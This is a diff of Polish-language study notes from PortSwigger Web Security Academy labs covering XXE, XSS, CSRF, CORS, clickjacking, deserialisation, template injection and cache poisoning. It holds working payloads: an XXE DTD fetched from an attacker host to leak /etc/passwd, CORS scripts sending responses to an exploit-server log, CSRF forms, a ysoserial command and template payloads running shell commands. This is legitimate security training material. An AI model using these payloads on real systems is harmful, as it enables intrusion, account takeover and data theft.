@@ -48,6 +48,7 @@ Jak to działa (chyba)?
 2. na serwerze dodajemy część kodu z zapytaniem:
 ```<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
 ```
+
 3. serwer wysyła zapytanie i zwracany jest błąd z nazwą ścieżki, która nie istnieje (bo jest to zawartość pliku /etc/passwd)
 notatka: nie możemy ostatecznego payloadu wpisać od razu, bo blokowane są entity, a w tym payloadzie, który wysyłamy entity tworzy się dopiero na serwerze
 
@@ -83,7 +84,7 @@ notatka: zablokowane zą zewnętrzne zapytania oraz tworzenie entity poza serwer
 
 
 
-## Lab: Exploiting XInclude to retrieve files
+Lab: Exploiting XInclude to retrieve files
 1. jest to przypadek, że nie mamy dostępu do całego dokumentu XML, a jedynie podajemy parametry do niego
 2. należy użyć wtedy `XInclude`, który pozwala na budowanie dokumentów XML, z sub-dokumentów
 3. Zamiast parametru podajemy zatem payload (zakodowany URL, zeby mógł być argumentm):
@@ -106,9 +107,9 @@ Lab: Reflected XSS into HTML context with most tags and attributes blocked
 3. Blokowane również są eventy.
 4. Enumerujemy po wszyskiech eventach i widzimy, że nie jest blokowany onresize
 5. Teraz należy wysłać payload do ofiary:
-- konstruujemy iframe, który od razu po załadowaniu zmienia szerokość, a zatem wywołuje onresize
-
-``` <iframe src="https://0aff008804477d86c05a1924003d00c4.web-security-academy.net/?search=<body onresize=print()>" onload=width='200px'>
+	- konstruujemy iframe, który od razu po załadowaniu zmienia szerokość, a zatem wywołuje onresize
+```
+<iframe src="https://0aff008804477d86c05a1924003d00c4.web-security-academy.net/?search=<body onresize=print()>" onload=width='200px'>
 ```
 
 ## Lab: Reflected XSS into HTML context with all tags blocked except custom ones ->> TODO
@@ -159,8 +160,8 @@ ${alert(document.domain)}
 ```
 # DOM BASED XSS 
 
-Jeżeli wrzucamy do innerHTML nie są akceptowane np. script i svg (nie bedą odpalone) 
-- Wtedy użyć można <frame> albo <img>
+Jeżeli wrzucamy do innerHTML nie są akceptowane np. script i svg (nie bedą odpalone):
+- Wtedy użyć można <iframe> ablo <img>
 
 Jeżeli mamy on hashchange to można użyć:
 ```
@@ -178,33 +179,28 @@ Jeżeli mamy payload do Angulara, to warto sobie poszukać pod konkretny framewo
 ## Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped
 1. payload wprowadzony jest do wnętrza skryptu, jednak nie możemy "wyjść" ze stringa, bo znak ' jest usuwany
 2. możemy jednak zakończyć całą sekcje skryptu dając payload:
-``` 
-</script><img src=1 onerror=alert()>
-```
+### 
+	</script><img src=1 onerror=alert()>
 
 ## Lab: Reflected DOM XSS
 1. Patrzymy na zwracaną wartość:
-```
-{"results":[],"searchTerm":"podana_wartość"}
-```
+###
+	{"results":[],"searchTerm":"podana_wartość"}
 2. Widzimy jakie znaki są escapowane, podajemy wartość:
-```
-\"-alert(1)}//
-```
+###
+	\"-alert(1)}//
 3. Co zamienia się w:
-```
-"\\"-alert(1)}//"
-```
+###
+    "\\"-alert(1)}//"
 i mamy:
-```
-{"searchTerm":"\\"-alert(1)}//", "results":[]}
-```
+
+    {"searchTerm":"\\"-alert(1)}//", "results":[]}
+
 
 # CSRF
 
 ## Lab: CSRF vulnerability with no defenses
 ### Skrypt zmieniający adres e-mail:
-```
     <html>
         <body>
             <form action="https://0ac4006304f120fbc02b4be100cd00c7.web-security-academy.net/my-account/change-email" method="POST">
@@ -215,12 +211,12 @@ i mamy:
             </script>
         </body>
     </html>
-```
+
 ## Lab: CSRF where token is not tied to user session
 1. Generujemy CSRF dal użytkownika, wysyłając zapyanie o zmiane maila, zapisujemy je i dropujemy request
 2. Sprawdzamy na drugim użytkowniku że podniana jego tokenu na ten działa
 3. robimy skrypt, który uruchamia zminae maila z dodanym wcześniej wygenerowanym tokenem
-```
+### 
     <html>
         <body>
             <form action="https://0a7400fb04acc082c085a8ac00ef0031.web-security-academy.net/my-account/change-email" method="POST">
@@ -232,14 +228,14 @@ i mamy:
             </script>
         </body>
     </html>
-```
+
 
 - `%0d%0a` -> nowa linia
 
 ## Lab:CSRF token is tied to a non-session cookie
 1. Jeśli mamy do zmiany dwa parametry warto użyć
 <img src="https://0ac9004504dc6294c0621d30000900a0.web-security-academy.net/?search=12341234%0d%0ASet-Cookie%3a+csrfKey%3dyoJrLzW6dVmSBKMnxPC8ZDk3wCmqjDWM" onerror="document.forms[0].submit()">, bo wtedy mamy pewność, że zapytania wykonają się w odpowiedniej kolejności
-```
+###
     <html>
         <body>
             <form action="https://0ac9004504dc6294c0621d30000900a0.web-security-academy.net/my-account/change-email" method="POST">
@@ -249,12 +245,12 @@ i mamy:
             <img src="https://0ac9004504dc6294c0621d30000900a0.web-security-academy.net/?search=12341234%0d%0ASet-Cookie%3a+csrfKey%3dyoJrLzW6dVmSBKMnxPC8ZDk3wCmqjDWM" onerror="document.forms[0].submit()">
         </body>
     </html>
-```
+
 
 ## Lab: CSRF where Referer validation depends on header being present 
 1. Z racji, że po usunięciu nagłówka Referer pomijane jest jego sprawdzenie, to należy dodać `<meta name="referrer" content="never">`, który informuje stronę, any takiego nagłówka nie dodawać
 2. Cały payhload wygląda tak:
-``` 
+### 
     <html>
         <body>
             <meta name="referrer" content="never">
@@ -266,7 +262,7 @@ i mamy:
             </script>
         </body>
     </html>
-```
+
 
 ## Lab: CSRF with broken Referer validation
 1. Ochrona przed CSRF polega na sprawdzaniu pola Referer w nagłówku, sprawdzanie polega jednak tylko na tym czy jest w nim strona, której szuka regex tj. działa również:
@@ -279,7 +275,7 @@ i mamy:
 ## Lab: CORS vulnerability with basic origin reflection
 1. Dopuszczalne jest zapytanie z każdej strony
 2. Wystarczy zatem skonstruować taki skrypt:
-```
+### 
     <script>
         var req = new XMLHttpRequest();
         req.onload = reqListener;
@@ -291,13 +287,13 @@ i mamy:
             location='/log?key='+this.responseText;
         };
     </script>
-```
+
 
 ## Lab: CORS vulnerability with trusted null origin
 1. Wpisując różne Origin do requesta widzimy że dostajemy nagłówek `Access-Control-Allow-Origin: null` dla wartości Origin: null
 2. WAŻNE: to że dostajemy odpowiedź nic nie znaczy, ważne jest żeby był nagłówek, bo nie chodzi o to że będzie blokowany request, a wykonywanie skryptów i przekierowanie cookie
 3. Aby w Origin uzyskać wartość null używamy iframe:
-```
+###
     <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
@@ -309,7 +305,6 @@ i mamy:
     location='https://exploit-0a8a000d0307b198c0d6462c01c400a8.web-security-academy.net/log?key='+this.responseText;
     };
     </script>"></iframe>
-```
 
 ## Lab: CORS vulnerability with trusted insecure protocols
 
@@ -319,7 +314,6 @@ i mamy:
 4. Konstruujemy skrypt i dodajemy do na exploit server:
 
 ### Payload
-```
     <script>
         document.location="http://stock.0a100003032beefac0af231c00de0028.web-security-academy.net/?productId=4
     	<script>
@@ -335,10 +329,9 @@ i mamy:
     	%3c/script>
         &storeId=1"
     </script>
-```
+
 
 # CLICKJACKING
-```
     <head>
     	<style>
     		iframe {
@@ -356,40 +349,36 @@ i mamy:
     			}
     	</style>
     </head>
-```
-```
+
     <body>
             <div>
             <button>click</button>
             </div>
     	<iframe src="https://0ae300220338ea26c0e098a70076003a.web-security-academy.net/my-account"> </iframe>
     </body>
-```
+
 ### Jeśli strona blokuje odpalanie jej w framie pomóc może dodanie sandbox="allow-forms":
-```
-<iframe src="https://0a3d000a04b97a33c050232a0098006e.web-security-academy.net/my-account" sandbox="allow-forms"> </iframe>
-```
+    <iframe src="https://0a3d000a04b97a33c050232a0098006e.web-security-academy.net/my-account" sandbox="allow-forms"> </iframe>
+
 
 
 # DOM-based vunabilities
 
 ## Web messages
-```
-<iframe src="https://0ad400b70311a7c0c07419ee0014008f.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
-```
+	<iframe src="https://0ad400b70311a7c0c07419ee0014008f.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
+
 	
 ## Lab: DOM XSS using web messages and a JavaScript URL
 1. Widzimy, że stroma pobiera wartość message i sprawdza, czy zawiera http: lub https:, jeśli tak wpisuje ją do href, jeśli nie to nie:
 2. Konstruujem zatem payload, który zawiera wywołanie funkcji print, a także słowo http, które poprzedzamy //, aby był to komentarz:
-```
-<iframe src="https://your-lab-id.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
-```
+###
+	<iframe src="https://your-lab-id.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
 
 ## Lab: DOM XSS using web messages and JSON.parse
 1. Jest to przykład z użyciem JSON.parse, który zmienia string w JSON, należy pamiętać, aby escapować znaki " w stringu, bo inaczej zrobią się z tego osobne stringi i nie zadziała
-```
-<iframe src="https://0ab200c5041cbdb3c018c71b008d0084.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\", \"url\":\"javascript:print()\"}","*")'>
-```
+###
+    <iframe src="https://0ab200c5041cbdb3c018c71b008d0084.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\", \"url\":\"javascript:print()\"}","*")'>
+
 
 ## Lab: DOM-based open redirection
 https://0aff009b03b537c9c039ad9c00ff0051.web-security-academy.net/post?postId=7#/url=https://exploit-0a04009b032a3781c0eaade3010e0095.web-security-academy.net
@@ -403,26 +392,22 @@ https://0aff009b03b537c9c039ad9c00ff0051.web-security-academy.net/post?postId=7#
 	- następnie robimy redirect, wtedy załaduje się link do przycisku, a tym samym wykona się skrypt
 
 ### Payload:
-```
-<iframe  width=1000px height=1000px src="https://0a8f00a8033e9886c0653d3300fa008e.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="window.location.href = 'https://0a8f00a8033e9886c0653d3300fa008e.web-security-academy.net/';">
-```
+    <iframe  width=1000px height=1000px src="https://0a8f00a8033e9886c0653d3300fa008e.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="window.location.href = 'https://0a8f00a8033e9886c0653d3300fa008e.web-security-academy.net/';">
 
-`Możliwa obfuskacja alert() może być alert```
+Możliwa obfuskacja alert() może być alert``
 
 
 # INSECURE DESERIALISATION
 ## PHP
-`String -> s:size:value;`
-`Integer -> i:value;`
-`Boolean ->b:value; (does not store "true" or "false", does store '1' or '0')`
-`Null -> N;`
-`Array -> a:size:{key definition;value definition;(repeated per element)}`
-`Object -> O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}`
+	String -> s:size:value;
+	Integer -> i:value;
+	Boolean ->b:value; (does not store "true" or "false", does store '1' or '0')
+	Null -> N;
+	Array -> a:size:{key definition;value definition;(repeated per element)}
+	Object -> O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)}
 
 ## Java
-```
-java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 > file.txt
-```
+	java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 > file.txt
 - tworzy dane zserializowane wykonujące daną komendę
 
 
@@ -438,19 +423,16 @@ java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | b
 
 # SERVER-SIDE TEMPLATE INJECTION
 ## Testy:
-```
-${{<%[%'"}}%\
-http://vulnerable-website.com/?username=${7*7}
-```
+    ${{<%[%'"}}%\
+    http://vulnerable-website.com/?username=${7*7}
+
 ## Payloady:
 ### Freemaker
-```
-<%= system("rm morale.txt") %> -> RUBY ERC
-<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm morale.txt")} -> Freemaker
-```
-
+	<%= system("rm morale.txt") %> -> RUBY ERC
+	<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm morale.txt")} -> Freemaker
+	
 ### handlebars
-```
+
     wrtz{{#with "s" as |string|}}
         {{#with "e"}}
             {{#with split as |conslist|}}
@@ -470,13 +452,12 @@ http://vulnerable-website.com/?username=${7*7}
             {{/with}}
         {{/with}}
     {{/with}} -> handlebars
-```
 
 ### django
-```
-{{settings.SECRET_KEY}} -> django
-{% debug %} -> django
-```
+
+	{{settings.SECRET_KEY}} -> django
+	{% debug %} -> django
+
 
 # WEB CACHE POISONING
 
@@ -493,9 +474,8 @@ http://vulnerable-website.com/?username=${7*7}
 2. Widzimy, że to pole wstawiane jest jako adres do /resources/json/geolocation.json
 3. Z pliku geolocation.js widzimy, że używany jest parametr "country"
 4. Dodajemy zatem na exploit serwer payload
-```
-{ "country": "<img src=1 onerror=alert(document.cookie)>" }
-```
+###
+	{ "country": "<img src=1 onerror=alert(document.cookie)>" }
 5. Do nagłówka dodajemy także `Access-Allow-Origin: *`, aby ominąć CORS
 
 ## Lab: Web cache poisoning via an unkeyed query string
